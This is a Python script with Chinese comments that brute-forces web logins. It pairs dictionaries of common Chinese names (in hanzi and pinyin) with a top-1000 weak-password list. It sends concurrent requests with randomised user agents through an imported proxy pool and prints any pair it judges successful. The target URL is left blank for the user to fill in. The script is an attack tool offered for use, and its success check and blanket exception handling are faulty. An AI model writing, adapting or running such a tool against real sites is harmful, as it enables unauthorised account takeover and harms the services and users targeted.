# !/usr/bin/python
# -*- coding:utf-8 -*-
# __Author__: VVzv

import time
import requests
import asyncio, aiohttp
from pool import header, proxies

THREAD = 5
# 加载用户名和密码字典
hanzi_name_dict = open('./top500_name_dict.txt', 'r').readlines()
pinyin_name_dict = open('./top500_name_pinyin_dict.txt', 'r').readlines()
weak_password_dict = open('./全国弱口令TOP1000.txt', 'r').readlines()

async def intruder(semaphore, uname, upasswd):
    # 链接地址，选择其中的用户名和密码（get型，post型添加data数据即可）
    url = "".format(str(uname.strip()), str(upasswd.strip()))
    async with semaphore:
        #print(123)
        try:
            async with aiohttp.ClientSession() as session:
                #print(456)
                #time.sleep(0.2)
                print('[*] 正在爆破%s->%s' % (uname, upasswd))
                async with session.get(url, headers=header.randUserAgent(), allow_redirects=False) as res:
                    #print('[*] 正在爆破%s->%s' % (uname, upasswd))
                    if res.status == 200 or "The URL has moved" not in res.text:
                        print('=========================================')
                        print("[+] 发现用户名:%s->密码:%s" % (uname, upasswd))
                        print('=========================================')
                        loop.stop()
                        time.sleep(1)
        except:
            pass

async def hanziRun():
    semaphore = asyncio.Semaphore(THREAD)
    login = [ intruder(uname=str(uname.strip()), upasswd=str(upasswd.strip()), semaphore=semaphore) for upasswd in weak_password_dict for uname in hanzi_name_dict ]
    await asyncio.wait(login)

async def pinyinRun():
    semaphore = asyncio.Semaphore(THREAD)
    login = [ intruder(uname=str(uname.strip()), upasswd=str(upasswd.strip()), semaphore=semaphore) for upasswd in weak_password_dict for uname in pinyin_name_dict ]
    await asyncio.wait(login)


if __name__ == '__main__':
    try:
        print('starting Now...')
        start = time.time()
        loop = asyncio.get_event_loop()
        loop.run_until_complete(pinyinRun())
        loop.close()
        end = time.time()
        print('[-] 爆破失败....')
        print(end - start)
    except:
        pass
